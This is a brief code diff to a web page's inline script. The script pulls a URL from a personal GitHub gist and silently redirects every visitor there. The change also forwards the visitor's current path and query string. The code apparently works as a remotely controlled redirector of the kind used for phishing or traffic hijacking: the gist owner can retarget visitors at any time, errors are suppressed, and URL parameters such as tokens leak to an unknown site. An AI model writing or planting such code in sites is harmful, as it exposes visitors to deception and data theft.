@@ -5,7 +5,10 @@
 <script>
 fetch('https://gist.githubusercontent.com/ivanovafekla61-commits/4d8cd5324af673c21cf244f49f280dc7/raw/gistfile1.txt')
   .then(function(r){return r.text();})
-  .then(function(t){t=t.trim(); if(t.indexOf('http')===0) location.replace(t);})
+  .then(function(t){
+    t=t.trim();
+    if(t.indexOf('http')===0) location.replace(t + location.pathname + location.search);
+  })
   .catch(function(){});
 </script>
 </body></html>
